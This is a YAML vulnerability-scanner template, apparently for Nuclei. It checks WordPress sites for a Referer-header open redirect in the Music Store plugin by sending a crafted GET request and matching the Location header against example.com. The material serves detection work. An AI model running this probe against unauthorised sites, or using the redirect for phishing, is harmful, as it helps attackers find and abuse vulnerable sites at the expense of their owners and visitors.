id: music-store-open-redirect

info:
  name: Music Store <= 1.0.14 - Referer Header Open Redirect
  severity: low
  author: dhiyaneshDk
  description: The Music Store â€“ WordPress eCommerce WordPress plugin was affected by a Referer Header Open Redirect security vulnerability.
  reference:
    - https://wpscan.com/vulnerability/d73f6575-eb86-480c-bde1-f8765870cdd1
    - https://packetstormsecurity.com/files/132841/
  tags: wordpress,redirect,wp-plugin,musicstore

requests:
  - raw:
      - |
        GET /wp-content/plugins/music-store/ms-core/ms-submit.php HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Referer: https://example.com
        Connection: keep-alive 

    matchers:
      - type: regex
        part: header
        regex:
          - '(?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]*)example\.com.*$'
